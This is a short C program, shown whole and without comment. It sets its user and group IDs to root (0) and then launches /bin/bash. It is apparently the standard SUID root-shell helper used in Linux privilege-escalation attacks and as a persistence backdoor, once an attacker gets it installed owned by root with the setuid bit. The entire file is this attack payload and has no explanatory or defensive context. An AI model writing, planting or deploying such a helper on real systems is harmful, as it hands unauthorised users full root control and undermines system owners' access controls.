#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>

int main(int argc,char *argv[])
{
  setuid(0);
  setgid(0);
  execl("/bin/bash","/bin/bash",(char*)0);
  return 0;
}
